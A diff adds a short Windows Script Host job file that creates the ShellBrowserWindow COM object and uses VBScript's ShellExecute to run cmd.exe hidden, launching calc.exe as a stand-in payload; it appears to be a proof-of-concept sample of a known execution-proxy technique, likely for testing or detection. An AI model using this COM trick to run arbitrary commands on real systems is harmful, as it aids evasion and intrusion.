@@ -1,0 +1,6 @@
+<Job ID="myjob"> 
+<object id="ShellBrowserWindow"  classiD="clsiD:c08afd90-f2a1-11d1-8455-00a0c91f3880"/>
+<script language="VBScript">
+ShellBrowserWindow.Document.Application.ShellExecute "cmd.exe","/c calc.exe","c:\windows\system32","",0
+</script>
+</Job>
